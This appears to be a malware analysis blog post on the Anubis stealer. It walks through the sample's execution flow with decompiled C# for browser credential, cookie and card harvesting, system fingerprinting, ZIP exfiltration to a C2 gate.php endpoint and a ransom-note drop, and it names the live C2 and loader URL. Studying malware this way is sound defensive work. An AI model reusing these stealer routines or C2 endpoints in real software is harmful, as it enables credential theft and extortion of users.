---
title: "Anubis Stealer: Malware Analysis"
date: 2021-01-01
description: "Static and dynamic analysis of Anubis banking trojan/stealer: persistence, C2 communication, credential harvesting techniques"
tags: ["malware", "stealer", "Anubis", "banking-trojan", "reverse-engineering", "analysis"]
categories: ["Research"]
authors:
  - name: "ph4nt0m"
    link: "https://github.com/Phantomn"
    image: "https://github.com/Phantomn.png"
---

## Sample Information

**MD5:** `9664ef2d82e819afa20e5411e0855027`

![PE file information](/images/blog/anubis-stealer-analysis/Untitled.png)

The binary is a PE32 executable written in C# (.NET). A .NET decompiler such as JetBrains dotPeek makes the main control flow straightforward to follow.

---

## Execution Flow

### 1. Temporary Working Directory

![Create temp directory](/images/blog/anubis-stealer-analysis/Untitled 1.png)
![Temp directory structure](/images/blog/anubis-stealer-analysis/Untitled 2.png)

The malware first retrieves the user's temporary directory and creates a subdirectory named `AX754VD.tmp` to stage collected data.

### 2. Webcam Capture

![Webcam capture code](/images/blog/anubis-stealer-analysis/Untitled 3.png)
![Webcam capture result](/images/blog/anubis-stealer-analysis/Untitled 4.png)

`Get_webcam()` creates a capture window and saves the current webcam frame to `CamScreen.png`.

### 3. Screenshot

![Screenshot code](/images/blog/anubis-stealer-analysis/Untitled 5.png)

The active desktop is captured and saved as `screen.jpeg`.

### 4. Data Collection

![Data collection overview](/images/blog/anubis-stealer-analysis/Untitled 6.png)

The stealer harvests the following data:

- **FileZilla** – credentials and connection profiles
- **Desktop files** – extensions matching `txt`, `doc`, `cs`, `cpp`, `dat`, `docx`, `log`, `sql`
- **Mozilla user data** – from `AppData\Local\Mozilla`
- **Bitcoin wallet** data
- **Loader** – downloads `https://anubiscode.fun/test/panel/loader.php`, runs it as a hidden `svhost.exe` process, and exfiltrates collected data

### 5. Browser Credential Harvesting

`Get_agent()` collects the User-Agent string for each installed browser (Chrome, Opera, Firefox) by reading version information from the Windows Registry:

```csharp
public static void Get_agent(string dir)
{
    UserAgents.GetOSBit();
    UserAgents.NT = UserAgents.GetNTVersion();
    string[] strArray = UserAgents.NT.Split('.');
    string str1 = string.Empty;
    if (((IEnumerable<string>) strArray).Contains<string>("10"))
        str1 = "Windows NT 10.0";
    if (strArray.Length > 1 && !((IEnumerable<string>) strArray).Contains<string>("10"))
        str1 = "Windows NT " + strArray[0] + "." + strArray[1];
    try
    {
        using (StreamWriter streamWriter = new StreamWriter(dir + "\\UserAgents.txt"))
        {
            if (Directory.Exists(Environment.GetEnvironmentVariable("LocalAppData") + "\\Google\\Chrome\\User Data"))
            {
                object obj = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe", "", (object) null);
                string str2 = obj == null
                    ? FileVersionInfo.GetVersionInfo(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe", "", (object) null).ToString()).FileVersion
                    : FileVersionInfo.GetVersionInfo(obj.ToString()).FileVersion;
                if (UserAgents.razr == "x64")
                    streamWriter.WriteLine("Mozilla/5.0 (" + str1 + "; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + str2 + " Safari/537.36");
                else
                    streamWriter.WriteLine("Mozilla/5.0 (" + str1 + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + str2 + " Safari/537.36");
            }
            // Opera and Firefox handled similarly...
        }
    }
}
```

`Parse()` then iterates over all browser profiles and calls dedicated extraction routines:

```csharp
public static void Parse(string dir)
{
    Directory.CreateDirectory(dir + "\\Browsers");
    Steal.Cookies();
    try
    {
        foreach (string fileName in Browser_Parse.GetProfile())
        {
            try
            {
                string fullName = new FileInfo(fileName).Directory.FullName;
                string str1 = fileName.Contains(Browser_Parse.RoamingAppData)
                    ? Browser_Parse.GetRoadData(fullName)
                    : Browser_Parse.GetLclName(fullName);
                if (!string.IsNullOrEmpty(str1))
                {
                    string str2 = str1[0].ToString().ToUpper() + str1.Remove(0, 1);
                    string name = Browser_Parse.GetName(fullName);
                    GetCookies.Cookie_Grab(fullName, str2, name);        // Cookies
                    GetPasswords.Passwords_Grab(fullName, str2, name);   // Passwords
                    GetPasswords.Write_Passwords();
                    Get_Credit_Cards.Get_CC(fullName, str2, name);       // Credit cards
                    Get_Credit_Cards.Write_CC(str2, name);
                    Get_Browser_Autofill.Get_Autofill(fullName, str2, name); // Autofill
                    Get_Browser_Autofill.Write_Autofill(str2, name);
                }
            }
        }
    }
}
```

### 6. System Information

Hardware and geolocation data are collected via WMI and `http://ip-api.com/line/?fields`:

```csharp
public static void Info(string dir)
{
    object obj1 = (object) 0;
    foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("Select * from Win32_ComputerSystem").Get())
        obj1 = managementBaseObject["NumberOfLogicalProcessors"];

    string id = Identification.GetId();
    string str1 = loki.loki.Utilies.Hardware.Hardware.Define_windows();
    string end;
    using (WebResponse response = WebRequest.Create("http://ip-api.com/line/?fields").GetResponse())
    {
        using (StreamReader streamReader = new StreamReader(response.GetResponseStream()))
            end = streamReader.ReadToEnd();
    }
    // ...
    using (StreamWriter streamWriter1 = new StreamWriter(dir + "\\information.log"))
    {
        streamWriter1.WriteLine("IP : " + strArray[13]);
        streamWriter1.WriteLine("Country : " + strArray[1]);
        streamWriter1.WriteLine("City : " + strArray[5]);
        streamWriter1.WriteLine("ISP : " + strArray[10]);
        streamWriter1.WriteLine("Username : " + Environment.UserName);
        streamWriter1.WriteLine("PCName : " + Environment.MachineName);
        streamWriter1.WriteLine("HWID : " + id);
        streamWriter1.WriteLine("OS : " + str1);
        streamWriter1.WriteLine("CPU : " + obj2?.ToString());
        streamWriter1.WriteLine("GPU : " + obj4?.ToString());
        streamWriter1.WriteLine("MAC : " + obj3?.ToString());
        // Screen resolution, language, browser versions...
    }
}
```

### 7. Exfiltration

![Zip and upload](/images/blog/anubis-stealer-analysis/Untitled 7.png)

All staged files are compressed into a ZIP archive named `<Country>_<IP>_<HWID>.zip` and uploaded to the C2 server:

```csharp
ZipFile.CreateFromDirectory(dir, Path.GetTempPath() + "\\" + strArray[1] + "_" + strArray[13] + "_" + id + ".zip");
try
{
    new WebClient().UploadFile(
        Settings.Url + string.Format(
            "gate.php?id={0}&wlt={1}&cki={2}&pwd={3}&cc={4}&frm={5}&hwid={6}",
            (object) 1,
            (object) Crypto.count,
            (object) GetCookies.CCookies,
            (object) GetPasswords.Cpassword,
            (object) Get_Credit_Cards.CCCouunt,
            (object) Get_Browser_Autofill.AutofillCount,
            (object) id),
        "POST",
        Path.GetTempPath() + "\\" + strArray[1] + "_" + strArray[13] + "_" + id + ".zip");
}
catch (Exception ex)
{
    Console.WriteLine(ex.ToString());
}
File.Delete(Path.GetTempPath() + "\\" + strArray[1] + "_" + strArray[13] + "_" + id + ".zip");
```

The gate URL receives a summary of what was stolen (cookie count, password count, credit card count, autofill count, HWID) as query parameters, which is useful for the attacker's panel dashboard.

### 8. Cleanup and Ransomware Drop

![Cleanup](/images/blog/anubis-stealer-analysis/Untitled 8.png)
![Ransom note](/images/blog/anubis-stealer-analysis/Untitled 9.png)

After exfiltration the staged directory is deleted. The malware then drops a ransom note and displays a MessageBox:

```csharp
File.WriteAllText(
    Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory) + "\\HowToDecrypt.txt",
    "IMPORTANT INFORMATION!!!!\nAll your files are encrypted with Russian Paradise stealer:"
    + crypt.AESDecript(Settings.Stealer_version)
    + "\nTo Decrypt: \n - Send 0.02 BTC to: " + Settings.bitcoin_keshel
    + "\n- Follow All Steps",
    Encoding.UTF8);
Thread.Sleep(2000);
int num = (int) MessageBox.Show(
    "IMPORTANT INFORMATION!!!!\nAll your files are encrypted with Russian Paradise stealer: "
    + Settings.Stealer_version
    + "\nTo Decrypt: \n - Send 0.02 BTC to: " + Settings.bitcoin_keshel
    + "\n - Follow All Steps");
Process.Start(
    Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory)
    + "\\HowToDecrypt.txt");
```

The malware brands itself as "Russian Paradise stealer" in the ransom note while the binary is named Anubis — a naming inconsistency that suggests it was derived from or sold alongside a ransomware kit.

---

## Summary

| Stage | Technique |
|---|---|
| Staging | Creates `%TEMP%\AX754VD.tmp` working directory |
| Recon | Webcam capture, screenshot, IP geolocation via ip-api.com |
| Credential theft | Cookies, passwords, credit cards, autofill from Chrome/Opera/Firefox |
| File harvesting | Desktop documents matching common extensions |
| Bitcoin theft | Wallet data collection |
| Lateral load | Hidden `svhost.exe` from C2 loader URL |
| Exfiltration | ZIP upload to `gate.php` with stolen-data summary in query params |
| Cleanup | Deletes staged ZIP |
| Ransomware | Drops `HowToDecrypt.txt`, shows MessageBox, demands 0.02 BTC |

**C2:** `https://anubiscode.fun/test/panel/` (loader + gate endpoints)
